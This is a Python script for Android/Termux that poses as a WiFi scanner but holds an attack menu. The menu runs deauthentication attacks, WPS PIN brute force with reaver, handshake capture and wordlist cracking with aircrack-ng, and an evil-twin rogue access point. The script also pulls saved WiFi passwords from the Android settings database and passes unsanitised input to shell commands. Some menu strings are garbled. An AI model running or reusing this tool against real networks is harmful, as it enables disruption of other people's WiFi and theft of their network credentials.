import datetime
import math
import subprocess
import json
import os
import shutil
import time
import sys
import traceback
import sqlite3
import re
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich.panel import Panel
from rich.columns import Columns
from rich.box import SIMPLE
from rich.prompt import Prompt, Confirm

# Inisialisasi konsol
console = Console()

# Konfigurasi
CONFIG_PATH = "wifi_scanner_config.json"
PASSWORD_DB_PATH = "/data/data/com.android.providers.settings/databases/settings.db"

def auto_install():
    """Menginstal dependensi yang diperlukan secara otomatis"""
    try:
        if not shutil.which("termux-wifi-scaninfo"):
            console.print("[yellow]⚠ Menginstal Termux-API...[/yellow]")
            os.system("pkg install termux-api -y > /dev/null 2>&1")
            console.print("[green]✓ Termux-API berhasil diinstal[/green]")
            time.sleep(1)
        
        try:
            import rich
        except ImportError:
            console.print("[yellow]⚠ Menginstal modul rich...[/yellow]")
            os.system("pip install rich -q")
            console.print("[green]✓ Modul rich berhasil diinstal[/green]")
            time.sleep(1)
            
        try:
            import requests
        except ImportError:
            console.print("[yellow]⚠ Menginstal modul requests...[/yellow]")
            os.system("pip install requests -q")
            console.print("[green]✓ Modul requests berhasil diinstal[/green]")
            time.sleep(1)
            
        attack_tools = ["aircrack-ng", "reaver", "bully", "mdk4", "hcxdumptool", "hcxtools"]
        for tool in attack_tools:
            if not shutil.which(tool):
                console.print(f"[yellow]⚠ Menginstal {tool}...[/yellow]")
                os.system(f"pkg install {tool} -y > /dev/null 2>&1")
                console.print(f"[green]✓ {tool} berhasil diinstal[/green]")
                time.sleep(1)
            
    except Exception as e:
        console.print(f"[red]✖ Error instalasi: {str(e)}[/red]")

def waktu_scan():
    now = datetime.datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def get_wifi_info():
    try:
        result = subprocess.check_output(
            ["termux-wifi-scaninfo"], 
            stderr=subprocess.STDOUT,
            text=True,
            timeout=15
        )
        
        try:
            datas = json.loads(result)
            if not isinstance(datas, list):
                console.print("[yellow]⚠ Data WiFi bukan berupa list, mengonversi...[/yellow]")
                return [datas] if isinstance(datas, dict) else []
            return datas
        except json.JSONDecodeError:
            console.print("[red]✖ Gagal memparse data WiFi[/red]")
            console.print(f"[dim]{result[:200]}...[/dim]")
            return []
            
    except subprocess.CalledProcessError as e:
        console.print(f"[red]✖ Error perintah: {e.output.strip()}[/red]")
        console.print("[yellow]ℹ Pastikan izin WiFi telah diberikan ke Termux[/yellow]")
    except subprocess.TimeoutExpired:
        console.print("[red]✖ Pemindaian WiFi melebihi batas waktu[/red]")
    except Exception as e:
        console.print(f"[red]✖ Error tak terduga: {str(e)}[/red]")
        traceback.print_exc()
    
    return []

def estimasi_jarak(freq, level):
    try:
        if freq <= 0 or level >= 0:
            return 0.0
            
        exp = (27.55 - (20 * math.log10(freq)) + abs(level)) / 20.0
        distance = round(pow(10.0, exp), 2)
        return distance
    except Exception as e:
        console.print(f"[red]⚠ Error estimasi jarak: {str(e)}[/red]")
        return 0.0

def keamanan_keterangan(caps):
    if not caps:
        return "Tidak diketahui"
    
    security_map = {
        'WPA2': 'WPA2',
        'WPA3': 'WPA3',
        'WPA': 'WPA',
        'WEP': 'WEP',
        'SAE': 'WPA3',
        'PSK': 'PSK',
        'EAP': 'EAP',
        'ESS': 'Open',
        'IBSS': 'Ad-hoc',
        'WPS': 'WPS',
        'MFP': 'MFA'
    }
    
    for key in security_map:
        if key in caps:
            return security_map[key]
    
    if 'WPA2' in caps:
        return 'WPA2'
    elif 'WPA' in caps:
        return 'WPA'
    elif 'WEP' in caps:
        return 'WEP'
    elif 'EAP' in caps:
        return 'EAP'
    
    return "Tidak diketahui"

def deteksi_channel(freq):
    try:
        freq = float(freq)
        if 2412 <= freq <= 2484:
            channel = int((freq - 2412) / 5) + 1
            return "2.4GHz", channel
        
        elif 5170 <= freq <= 5895:
            channel = int((freq - 5170) / 5) + 34
            return "5GHz", channel
            
        elif 5955 <= freq <= 7115:
            channel = int((freq - 5955) / 5) + 1
            return "6GHz", channel
            
    except (ValueError, TypeError):
        pass
    
    return "Tidak diketahui", "?"

def loading_bar():
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task = progress.add_task(
                description="[green]Memindai jaringan WiFi...", 
                total=100
            )
            for _ in range(100):
                time.sleep(0.03)
                progress.update(task, advance=1)
    except Exception as e:
        console.print(f"[yellow]⚠ Progress bar error: {str(e)}[/yellow]")
        console.print("[green]Memindai jaringan WiFi...[/green]")
        time.sleep(2)

def banner():
    ascii_art = """
╔═╗╔═╗╔═╗╦═╗╔═╗╔╦╗  ╔╦╗╔═╗╔═╗╔╦╗╔═╗╔╗╔╦╦ ╦╔╦╗
╚═╗║╣ ║  ╠╦╝║╣  ║    ║║╠═╣║╣ ║║║║ ║║║║║║ ║║║║
╚═╝╚═╝╚═╝╩╚═╚═╝ ╩   ═╩╝╩ ╩╚═╝╩ ╩╚═╝╝╚╝╩╚═╝╩ ╩

::=========[ ☠ WIFI SCANNER v6.0 ☠ ]=========::
    """
    console.print(ascii_art, style="bold green")
    
    sys_info = [
        f"[bold]• Waktu:[/bold] [cyan]{waktu_scan()}[/cyan]",
        f"[bold]• Perangkat:[/bold] [cyan]{os.uname().machine}[/cyan]",
        f"[bold]• Python:[/bold] [cyan]{sys.version.split()[0]}[/cyan]",
        f"[bold]• Direktori:[/bold] [cyan]{os.getcwd()}[/cyan]",
        f"[bold]• Mode Jaringan:[/bold] [red]WLAN/WAN/Hotspot[/red]"
    ]
    
    console.print(Columns(sys_info, equal=False, expand=True))
    console.print("[dim]" + "="*60 + "[/dim]\n")

def simpan_config(config):
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(config, f, indent=4)
        return True
    except Exception as e:
        console.print(f"[red]✖ Gagal menyimpan konfigurasi: {str(e)}[/red]")
        return False

def muat_config():
    try:
        if os.path.exists(CONFIG_PATH):
            with open(CONFIG_PATH, "r") as f:
                return json.load(f)
    except:
        pass
    return {"last_scan": "", "wifi": []}

def export_data(wifi_list):
    try:
        waktu = waktu_scan().replace(":", "").replace(" ", "_").replace("-", "")
        json_file = f"wifi_scan_{waktu}.json"
        
        os.makedirs("scan_results", exist_ok=True)
        file_path = os.path.join("scan_results", json_file)
        
        with open(file_path, "w") as f:
            json.dump(wifi_list, f, indent=4)
        
        console.print(f"\n[green]✅ Data berhasil diekspor ke:[/green] [bold]{file_path}[/bold]")
        return True
    except Exception as e:
        console.print(f"[red]✖ Gagal mengekspor data: {str(e)}[/red]")
        return False

def tampilkan_detail_wifi(wifi):
    try:
        sinyal = wifi['Signal Level (dBm)']
        if sinyal > -50:
            sinyal_color = "bold green"
        elif sinyal > -70:
            sinyal_color = "bold yellow"
        else:
            sinyal_color = "bold red"
        
        keamanan = wifi['Keamanan']
        if "WPA3" in keamanan:
            keamanan_color = "bold green"
        elif "WPA2" in keamanan:
            keamanan_color = "bold yellow"
        elif "Open" in keamanan:
            keamanan_color = "bold red"
        else:
            keamanan_color = ""
        
        tipe = wifi['Tipe Jaringan']
        if "WAN" in tipe:
            tipe_color = "bold blue"
        elif "Hotspot" in tipe:
            tipe_color = "bold magenta"
        elif "Guest" in tipe:
            tipe_color = "bold cyan"
        else:
            tipe_color = ""
        
        panel_content = f"""
[bold]{wifi['SSID']}[/bold] [{tipe_color}]({tipe})[/{tipe_color}]
├─ [dim]BSSID:[/dim] [cyan]{wifi['BSSID']}[/cyan]
├─ [dim]Frekuensi:[/dim] [yellow]{wifi['Frequency (MHz)']} MHz[/yellow]
├─ [dim]Band:[/dim] [magenta]{wifi['Channel Band']}[/magenta]
├─ [dim]Channel:[/dim] [magenta]{wifi.get('Channel Number', '?')}[/magenta]
├─ [dim]Sinyal:[/dim] [{sinyal_color}]{sinyal} dBm[/{sinyal_color}]
├─ [dim]Keamanan:[/dim] [{keamanan_color}]{keamanan}[/{keamanan_color}]
├─ [dim]Jarak Estimasi:[/dim] [blue]{wifi['Estimasi Jarak (m)']} meter[/blue]
├─ [dim]Lebar Channel:[/dim] [cyan]{wifi['Channel Width']}[/cyan]
├─ [dim]Venue:[/dim] {wifi['Venue']}
├─ [dim]Operator:[/dim] {wifi['Operator']}
├─ [dim]RTT Responder:[/dim] {wifi['RTT Responder']}
├─ [dim]WPS:[/dim] {wifi['WPS Supported']}
└─ [dim]Password:[/dim] {wifi['Password']}
        """
        
        console.print(
            Panel(
                panel_content, 
                title="📶 Detail Jaringan WiFi", 
                box=SIMPLE,
                padding=(1, 2),
                style="dim"
            )
        )
        return True
    except Exception as e:
        console.print(f"[red]⚠ Error menampilkan detail: {str(e)}[/red]")
        return False

def tampilkan_ringkasan(hasil):
    try:
        total_jaringan = len(hasil)
        jaringan_terbuka = sum(1 for w in hasil if "Open" in w['Keamanan'])
        jaringan_wpa2 = sum(1 for w in hasil if "WPA2" in w['Keamanan'])
        jaringan_wpa3 = sum(1 for w in hasil if "WPA3" in w['Keamanan'])
        
        wlan_count = sum(1 for w in hasil if "WLAN" in w['Tipe Jaringan'])
        wan_count = sum(1 for w in hasil if "WAN" in w['Tipe Jaringan'])
        guest_count = sum(1 for w in hasil if "Guest" in w['Tipe Jaringan'])
        hotspot_count = sum(1 for w in hasil if "Hotspot" in w['Tipe Jaringan'])
        
        ringkasan = f"""
[bold]Ringkasan Pemindaian:[/bold]
├─ Total Jaringan: [cyan]{total_jaringan}[/cyan]
├─ Jaringan Terbuka: [red]{jaringan_terbuka}[/red]
├─ Jaringan WPA2: [yellow]{jaringan_wpa2}[/yellow]
├─ Jaringan WPA3: [green]{jaringan_wpa3}[/green]
├─ [bold]Jenis Jaringan:[/bold]
│  ├─ WLAN: [cyan]{wlan_count}[/cyan]
│  ├─ WAN: [blue]{wan_count}[/blue]
│  ├─ Guest: [magenta]{guest_count}[/magenta]
│  └─ Hotspot: [red]{hotspot_count}[/red]
        """
        
        console.print(Panel(ringkasan, title="📊 Ringkasan", style="blue", box=SIMPLE))
        return True
    except Exception as e:
        console.print(f"[red]⚠ Error menampilkan ringkasan: {str(e)}[/red]")
        return False

def dapatkan_password_wifi():
    try:
        if not os.path.exists("/system/bin/su") and not os.path.exists("/system/xbin/su"):
            console.print("[red]✖ Perangkat belum di-root![/red]")
            console.print("[yellow]ℹ Fitur ini hanya tersedia untuk perangkat yang sudah di-root[/yellow]")
            return {}
        
        if not os.path.exists(PASSWORD_DB_PATH):
            console.print("[red]✖ File database password tidak ditemukan![/red]")
            console.print(f"[yellow]ℹ Path yang dicari: {PASSWORD_DB_PATH}[/yellow]")
            return {}
        
        conn = sqlite3.connect(PASSWORD_DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute("SELECT value FROM secure WHERE name='wifi_network_history'")
        result = cursor.fetchone()
        
        if not result:
            console.print("[red]✖ Tidak ada data password WiFi yang ditemukan[/red]")
            return {}
        
        wifi_data = result[0]
        password_dict = {}
        
        ssid_pattern = r'<string name="SSID">(.*?)</string>'
        password_pattern = r'<string name="PreSharedKey">(.*?)</string>'
        
        ssids = re.findall(ssid_pattern, wifi_data)
        passwords = re.findall(password_pattern, wifi_data)
        
        for i, ssid in enumerate(ssids):
            if i < len(passwords):
                password_dict[ssid] = passwords[i]
        
        conn.close()
        return password_dict
        
    except Exception as e:
        console.print(f"[red]✖ Error mendapatkan password: {str(e)}[/red]")
        traceback.print_exc()
        return {}

def tampilkan_password_wifi():
    console.print("[yellow]⏳ Mencari password WiFi tersimpan...[/yellow]")
    
    passwords = dapatkan_password_wifi()
    
    if not passwords:
        console.print("[red]✖ Tidak ada password WiFi yang ditemukan[/red]")
        return
    
    table = Table(title="📶 Password WiFi Tersimpan", show_header=True, header_style="bold magenta")
    table.add_column("SSID", style="cyan")
    table.add_column("Password", style="green")
    
    for ssid, password in passwords.items():
        table.add_row(ssid, password)
    
    console.print(table)
    
    if Confirm.ask("\n[bold yellow]💾 Apakah Anda ingin menyimpan password ke file?[/bold yellow]"):
        try:
            waktu = waktu_scan().replace(":", "").replace(" ", "_").replace("-", "")
            file_path = f"wifi_passwords_{waktu}.txt"
            
            with open(file_path, "w") as f:
                f.write("Daftar Password WiFi Tersimpan:\n")
                f.write("="*50 + "\n")
                for ssid, password in passwords.items():
                    f.write(f"SSID: {ssid}\nPassword: {password}\n")
                    f.write("-"*50 + "\n")
            
            console.print(f"[green]✅ Password berhasil disimpan di: [bold]{file_path}[/bold][/green]")
        except Exception as e:
            console.print(f"[red]✖ Gagal menyimpan password: {str(e)}[/red]")

def deteksi_tipe_jaringan(ssid, bssid, freq, level):
    try:
        if level > -40:
            return "WAN"
            
        ssid_lower = ssid.lower()
        guest_keywords = ['guest', 'tamu', 'visitor', 'public', 'open', 'free']
        if any(kw in ssid_lower for kw in guest_keywords):
            return "Guest Network"
            
        hotspot_keywords = ['android', 'iphone', 'galaxy', 'mobile', 'hotspot', 'personal']
        if any(kw in ssid_lower for kw in hotspot_keywords) and freq < 3000:
            return "Mobile Hotspot"
            
        return "WLAN"
    except:
        return "WLAN"

def get_wan_info():
    try:
        try:
            import requests
        except ImportError:
            console.print("[yellow]⚠ Menginstal modul requests...[/yellow]")
            os.system("pip install requests -q")
            import requests
        
        console.print("[cyan]🔄 Mendapatkan informasi WAN...[/cyan]")
        
        ip_response = requests.get('https://api.ipify.org?format=json', timeout=10)
        ip_data = ip_response.json()
        public_ip = ip_data['ip']
        
        loc_response = requests.get(f'https://ipinfo.io/{public_ip}/json', timeout=10)
        loc_data = loc_response.json()
        
        isp = loc_data.get('org', 'Tidak diketahui')
        city = loc_data.get('city', 'Tidak diketahui')
        country = loc_data.get('country', 'Tidak diketahui')
        
        table = Table(title="🌐 Informasi Jaringan WAN", show_header=False, box=SIMPLE)
        table.add_column("Kategori", style="bold cyan")
        table.add_column("Nilai", style="green")
        
        table.add_row("IP Publik", public_ip)
        table.add_row("ISP", isp)
        table.add_row("Kota", city)
        table.add_row("Negara", country)
        table.add_row("Tipe Jaringan", "WAN (Wide Area Network)")
        
        console.print(table)
        return True
    except Exception as e:
        console.print(f"[red]✖ Gagal mendapatkan info WAN: {str(e)}[/red]")
        return False

def kelola_mobile_hotspot():
    try:
        console.print("\n[bold]📱 Manajemen Mobile Hotspot[/bold]")
        menu_hotspot = [
            "[green][1][/green] Aktifkan Hotspot",
            "[yellow][2][/yellow] Nonaktifkan Hotspot",
            "[cyan][3][/cyan] Ubah SSID Hotspot",
            "[blue][4][/blue] Ubah Password Hotspot",
            "[red][0][/red] Kembali"
        ]
        console.print(Columns(menu_hotspot, equal=False, expand=True))
        
        pilihan = Prompt.ask("[bold cyan]>> Pilih aksi[/bold cyan]", choices=["1", "2", "3", "4", "0"])
        
        if pilihan == '1':
            console.print("[green]🚀 Mengaktifkan mobile hotspot...[/green]")
            os.system("svc wifi enable && svc wifi hotspot enable")
            console.print("[green]✓ Hotspot berhasil diaktifkan[/green]")
            
        elif pilihan == '2':
            console.print("[yellow]🛑 Menonaktifkan mobile hotspot...[/yellow]")
            os.system("svc wifi hotspot disable")
            console.print("[green]✓ Hotspot berhasil dinonaktifkan[/green]")
            
        elif pilihan == '3':
            ssid = Prompt.ask("[cyan]• Masukkan SSID baru untuk hotspot[/cyan]")
            os.system(f"settings put global wifi_hotspot_ssid {ssid}")
            console.print(f"[green]✓ SSID hotspot berhasil diubah menjadi: {ssid}[/green]")
            
        elif pilihan == '4':
            password = Prompt.ask("[cyan]• Masukkan password baru untuk hotspot[/cyan]")
            os.system(f"settings put global wifi_hotspot_password {password}")
            console.print("[green]✓ Password hotspot berhasil diubah[/green]")
            
        elif pilihan == '0':
            return True
            
        return True
    except Exception as e:
        console.print(f"[red]✖ Error manajemen hotspot: {str(e)}[/red]")
        return False

# ====================== PERBAIKAN FUNGSI DEAUTH ======================
def cek_interface_wifi():
    """Mendeteksi interface WiFi yang tersedia"""
    try:
        result = subprocess.check_output(["iwconfig"], text=True)
        interfaces = re.findall(r'^\w+', result, re.MULTILINE)
        for iface in interfaces:
            if iface.startswith("wlan"):
                return iface
        return "wlan0"  # Default
    except:
        return "wlan0"

def deauth_all(interface, access_point, number):
    """Melakukan serangan deauthentication ke semua klien"""
    iface = cek_interface_wifi()
    console.print(f"[yellow]ℹ Menggunakan interface: {iface}[/yellow]")
    command = f"sudo aireplay-ng -0 {number} -a {access_point} {iface}"
    console.print(f"[dim]🚀 Menjalankan: {command}[/dim]")
    os.system(command)
    return True

def deauth_client(interface, access_point, client, number):
    """Melakukan serangan deauthentication ke klien tertentu"""
    iface = cek_interface_wifi()
    console.print(f"[yellow]ℹ Menggunakan interface: {iface}[/yellow]")
    command = f"sudo aireplay-ng -0 {number} -a {access_point} -c {client} {iface}"
    console.print(f"[dim]🚀 Menjalankan: {command}[/dim]")
    os.system(command)
    return True

def tampilkan_menu_deauth(target):
    """Menampilkan menu deauthentication attack"""
    try:
        console.print("\n[bold]🔴 Jenis Serangan Deauth:[/bold]")
        menu_deauth = [
            "[1] Deauth semua klien",
            "[2] Deauth klien tertentu",
            "[0] Kembali"
        ]
        console.print(Columns(menu_deauth, equal=False, expand=True))
        
        pilihan = Prompt.ask(">> Plih jenis serangan [1/2/0]", choices=["1", "2", "0"])
        
        if pilihan == '1':
            number = Prompt.ask("• Junin paket deauin (default: 10):", default="10")
            if deauth_all("wlan0", target['BSSID'], number):
                console.print(f"[green]✓ Serangan deauin ke senna klien {target['SSID']} selssai![/green]")
            else:
                console.print("[red]✖ Gagal melakukan serangan deauth![/red]")
        
        elif pilihan == '2':
            client = Prompt.ask("• MAC address klien target")
            number = Prompt.ask("• Junin paket deauin (default: 10):", default="10")
            if deauth_client("wlan0", target['BSSID'], client, number):
                console.print(f"[green]✓ Serangan deauin ke klien {client} selssai![/green]")
            else:
                console.print("[red]✖ Gagal melakukan serangan deauth![/red]")
        
        elif pilihan == '0':
            return True
        
        return True
    except KeyboardInterrupt:
        console.print("\n[green]🛑 Serangan dihentikan![/green]")
        return True
    except Exception as e:
        console.print(f"[red]✖ Error dalam menu deauth: {str(e)}[/red]")
        return False

# ====================== FUNGSI SERANGAN ======================
def serangan_deauth(target_bssid, hasil):
    try:
        target = None
        for wifi in hasil:
            if wifi['BSSID'] == target_bssid:
                target = wifi
                break
        
        if not target:
            console.print("[red]✖ Target tidak ditemukan![/red]")
            return False
            
        return tampilkan_menu_deauth(target)
        
    except KeyboardInterrupt:
        console.print("\n[green]🛑 Serangan dihentikan![/green]")
        return True
    except Exception as e:
        console.print(f"[red]✖ Error serangan deauth: {str(e)}[/red]")
        return False

def serangan_wps(target_bssid, target_channel):
    try:
        console.print(f"[red]🚀 Memulai serangan WPS PIN ke {target_bssid}[/red]")
        console.print("[yellow]ℹ Proses ini bisa memakan waktu beberapa jam[/yellow]")
        
        command = f"reaver -i wlan0 -b {target_bssid} -c {target_channel} -vv"
        os.system(command)
        return True
        
    except KeyboardInterrupt:
        console.print("\n[green]🛑 Serangan dihentikan![/green]")
        return True
    except Exception as e:
        console.print(f"[red]✖ Error serangan WPS: {str(e)}[/red]")
        return False

def serangan_bruteforce(target_bssid, wordlist_path):
    try:
        if not os.path.exists(wordlist_path):
            console.print("[red]✖ File wordlist tidak ditemukan![/red]")
            return False
            
        console.print(f"[red]🚀 Memulai serangan brute force ke {target_bssid}[/red]")
        console.print(f"[yellow]ℹ Menggunakan wordlist: {wordlist_path}[/yellow]")
        console.print("[yellow]ℹ Proses ini bisa memakan waktu lama[/yellow]")
        
        cap_file = f"capture_{target_bssid.replace(':', '')}.cap"
        
        console.print("[cyan]⏳ Menunggu handshake...[/cyan]")
        capture_cmd = f"airodump-ng wlan0 --bssid {target_bssid} -w {cap_file}"
        os.system(capture_cmd)
        
        console.print("[cyan]🔥 Memulai brute force...[/cyan]")
        brute_cmd = f"aircrack-ng {cap_file}-01.cap -w {wordlist_path}"
        os.system(brute_cmd)
        return True
        
    except KeyboardInterrupt:
        console.print("\n[green]🛑 Serangan dihentikan![/green]")
        return True
    except Exception as e:
        console.print(f"[red]✖ Error serangan brute force: {str(e)}[/red]")
        return False

def serangan_rogue_ap(ssid, channel):
    try:
        console.print(f"[red]🚀 Membuat rogue AP: {ssid}[/red]")
        console.print("[yellow]ℹ Pastikan perangkat mendukung mode monitor[/yellow]")
        
        os.system("sudo airmon-ng start wlan0")
        
        command = f"sudo airbase-ng -a {':'.join(['00']*6)} --essid \"{ssid}\" -c {channel} wlan0mon"
        os.system(command)
        return True
        
    except KeyboardInterrupt:
        console.print("\n[green]🛑 Serangan dihentikan![/green]")
        return True
    except Exception as e:
        console.print(f"[red]✖ Error rogue AP: {str(e)}[/red]")
        return False

def tampilkan_menu_serangan(hasil):
    """Menampilkan menu serangan WiFi"""
    table = Table(title="📶 Target Serangan", show_header=True, header_style="bold red")
    table.add_column("No", style="cyan")
    table.add_column("SSID", style="bold cyan")
    table.add_column("BSSID", style="dim")
    table.add_column("Tipo", justify="center")
    table.add_column("Kommunen", justify="center")
    table.add_column("Channel", justify="center")
    
    for i, wifi in enumerate(hasil, 1):
        tipe = wifi['Tipe Jaringan']
        if "WAN" in tipe:
            tipe_color = "bold blue"
        elif "Hotspot" in tipe:
            tipe_color = "bold magenta"
        elif "Guest" in tipe:
            tipe_color = "bold cyan"
        else:
            tipe_color = "bold"
        
        table.add_row(
            str(i),
            wifi['SSID'],
            wifi['BSSID'],
            f"[{tipe_color}]{tipe}[/{tipe_color}]",
            wifi['Keamanan'],
            str(wifi.get('Channel Number', '?'))
        )
    
    console.print(table)
    
    try:
        pilihan = int(Prompt.ask(">> Plih target serangan (nome):"))
        if 1 <= pilihan <= len(hasil):
            target = hasil[pilihan-1]
            
            console.print("\n[bold]🔴 Jenis Serangan:[/bold]")
            menu_serangan = [
                "[1] Deauthentication Attack",
                "[2] WPS PIN Attack",
                "[3] Brute Force Password",
                "[4] Rogue AP (evil twin)",
                "[0] Kembali"
            ]
            console.print(Columns(menu_serangan, equal=False, expand=True))
            
            jenis_serangan = Prompt.ask(">> Plih jenis serangan [1/2/3/4/0]", choices=["1", "2", "3", "4", "0"])
            
            if jenis_serangan == '1':
                serangan_deauth(target['BSSID'], hasil)
            elif jenis_serangan == '2':
                serangan_wps(target['BSSID'], target.get('Channel Number', 1))
            elif jenis_serangan == '3':
                wordlist = Prompt.ask("• Path ke file wordlist")
                serangan_bruteforce(target['BSSID'], wordlist)
            elif jenis_serangan == '4':
                serangan_rogue_ap(target['SSID'], target.get('Channel Number', 6))
            elif jenis_serangan == '0':
                return
        else:
            console.print("[red]✖ Nomor tidak valid![/red]")
    except ValueError:
        console.print("[red]✖ Input harus angka![/red]")

# ====================== FUNGSI UTAMA DENGAN PERBAIKAN ======================
def wifi_scan():
    auto_install()
    
    config = muat_config()
    last_scan = config.get("last_scan", "")
    
    stored_passwords = dapatkan_password_wifi()
    
    console.clear()
    banner()
    
    console.print("[yellow]ℹ Memulai pemindaian jaringan WiFi...[/yellow]")
    loading_bar()
    wifi_raw = get_wifi_info()
    
    if not wifi_raw:
        console.print("[red]✖ Tidak ada jaringan WiFi terdeteksi![/red]")
        console.print("[yellow]ℹ Pastikan:[/yellow]")
        console.print("1. WiFi diaktifkan")
        console.print("2. Izin lokasi diberikan ke Termux")
        console.print("3. Perangkat dalam jangkauan jaringan WiFi")
        return

    hasil = []
    for i, wifi in enumerate(wifi_raw, 1):
        try:
            ssid = wifi.get('ssid', '') or "<Hidden>"
            bssid = wifi.get('bssid', 'N/A')
            freq = wifi.get('frequency', 0)
            level = wifi.get('signal_level', 0) or wifi.get('rssi', 0)
            channel_width = wifi.get('channelWidth', "N/A")
            timestamp = wifi.get('timestamp', "N/A")
            capabilities = wifi.get('capabilities', "")
            
            security = keamanan_keterangan(capabilities)
            distance = estimasi_jarak(freq, level)
            channel_band, channel_num = deteksi_channel(freq)
            venue = wifi.get('venueName', "")
            operator = wifi.get('operatorFriendlyName', "")
            rtt = "Ya" if wifi.get('is80211mcResponder', False) else "Tidak"
            wps = "Ya" if "WPS" in capabilities else "Tidak"
            
            tipe = deteksi_tipe_jaringan(ssid, bssid, freq, level)
            
            password = stored_passwords.get(ssid, "❌ Tidak tersedia (Android tidak menyimpan)")
            
            hasil.append({
                "No": i,
                "SSID": ssid,
                "BSSID": bssid,
                "Frequency (MHz)": freq,
                "Channel Band": channel_band,
                "Channel Number": channel_num,
                "Signal Level (dBm)": level,
                "Channel Width": channel_width,
                "Timestamp": timestamp,
                "Keamanan": security,
                "Estimasi Jarak (m)": distance,
                "Venue": venue,
                "Operator": operator,
                "RTT Responder": rtt,
                "WPS Supported": wps,
                "Password": password,
                "Tipe Jaringan": tipe
            })
        except Exception as e:
            console.print(f"[red]⚠ Error memproses jaringan #{i}: {str(e)}[/red]")

    waktu_terakhir = waktu_scan()
    console.print(f"[green]✓ Pemindaian selesai pada: {waktu_terakhir}[/green]")
    console.print(f"[green]• Jaringan terdeteksi: {len(hasil)}[/green]")
    
    if last_scan:
        console.print(f"[dim]• Terakhir dipindai: {last_scan}[/dim]")

    config["last_scan"] = waktu_terakhir
    config["wifi"] = hasil
    simpan_config(config)

    tampilkan_ringkasan(hasil)

    # Tampilkan hasil dalam tabel sesuai format
    table = Table(
        title=f"Daftar Jaringan WiFi ({len(hasil)})", 
        show_header=True, 
        header_style="bold magenta",
        show_lines=False
    )
    table.add_column("No", justify="center", style="cyan", no_wrap=True)
    table.add_column("SSID", style="bold cyan", min_width=15)
    table.add_column("BSSID", style="dim", min_width=12)
    table.add_column("Tipo", justify="center", min_width=10)
    table.add_column("Kommunen", justify="center", min_width=8)
    table.add_column("Channel", justify="center", min_width=8)

    for wifi in hasil:
        sinyal = wifi['Signal Level (dBm)']
        if sinyal > -50:
            sinyal_color = "green"
        elif sinyal > -70:
            sinyal_color = "yellow"
        else:
            sinyal_color = "red"
        
        keamanan = wifi['Keamanan']
        if "WPA3" in keamanan:
            keamanan_color = "green"
        elif "WPA2" in keamanan:
            keamanan_color = "yellow"
        elif "Open" in keamanan:
            keamanan_color = "red"
        else:
            keamanan_color = "dim"
        
        tipe = wifi['Tipe Jaringan']
        if "WAN" in tipe:
            tipe_color = "blue"
        elif "Hotspot" in tipe:
            tipe_color = "magenta"
        elif "Guest" in tipe:
            tipe_color = "cyan"
        else:
            tipe_color = "white"
        
        table.add_row(
            str(wifi['No']),
            wifi['SSID'],
            wifi['BSSID'],
            f"[{tipe_color}]{tipe}[/{tipe_color}]",
            f"[{keamanan_color}]{keamanan}[/{keamanan_color}]",
            str(wifi.get('Channel Number', '?'))
        )

    console.print(table)
    console.print("[dim]Gunakan menu di bawah untuk operasi lebih lanjut[/dim]")

    # Menu interaktif yang disesuaikan
    while True:
        try:
            console.print("\n[bold]📋 Menu Utama:[/bold]")
            menu_options = [
                "[1] Link Users",
                "[2] Scripts Detail_Jarangan",
                "[3] Scripts Setup_Jarangan",
                "[4] Scripts Setup_Jarangan",
                "[5] Scripts Setup_Jarangan",
                "[6] Target Serangan",
                "[7] Info Sistem",
                "[8] Kelola Hotspot",
                "[0] Keluar"
            ]
            console.print(Columns(menu_options, equal=False, expand=True))
            
            pilihan = Prompt.ask("\n>> Plih menu [1/2/3/4/5/6/7/8/0]", choices=["1", "2", "3", "4", "5", "6", "7", "8", "0"])
            
            if pilihan == '1':  # Link Users
                console.print("[yellow]⚠ Fitur belum tersedia[/yellow]")
            
            elif pilihan in ['2', '3', '4', '5']:  # Scripts
                console.print(f"[yellow]⚠ Script {pilihan} belum diimplementasikan[/yellow]")
            
            elif pilihan == '6':  # Target Serangan
                tampilkan_menu_serangan(hasil)
            
            elif pilihan == '7':  # Info Sistem
                console.print(Panel(
                    f"Python: {sys.version.split()[0]}\n"
                    f"Sistem: {os.uname().sysname}\n"
                    f"Perangkat: {os.uname().machine}\n"
                    f"Direktori: {os.getcwd()}",
                    title="🖥️ Info Sistem"
                ))
            
            elif pilihan == '8':  # Kelola Hotspot
                kelola_mobile_hotspot()
            
            elif pilihan == '0':  # Keluar
                console.print("[green]🚪 Keluar dari aplikasi...[/green]")
                sys.exit(0)
                
        except KeyboardInterrupt:
            console.print("\n[green]🚪 Keluar dari aplikasi...[/green]")
            sys.exit(0)
        except Exception as e:
            console.print(f"[red]✖ Error menu: {str(e)}[/red]")

if __name__ == "__main__":
    try:
        wifi_scan()
    except KeyboardInterrupt:
        console.print("\n[green]🚪 Keluar dari aplikasi...[/green]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]‼️ Error kritis: {str(e)}[/red]")
        traceback.print_exc()
        console.print("[yellow]ℹ Silakan laporkan issue ini ke developer[/yellow]")
        sys.exit(1)